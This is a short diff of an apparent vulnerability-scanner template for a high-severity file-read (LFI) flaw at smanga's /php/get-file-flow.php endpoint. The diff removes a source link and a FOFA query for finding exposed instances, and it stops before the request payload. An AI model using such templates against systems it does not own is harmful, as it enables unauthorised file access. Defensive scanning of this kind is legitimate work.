@@ -3,12 +3,8 @@ info:
   name: smanga get-file-flow 文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ceal6od5kbdkyhff'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ceal6od5kbdkyhff
-    fofa: title="smanga"
 http:
 - raw:
   - 'POST /php/get-file-flow.php HTTP/1.1
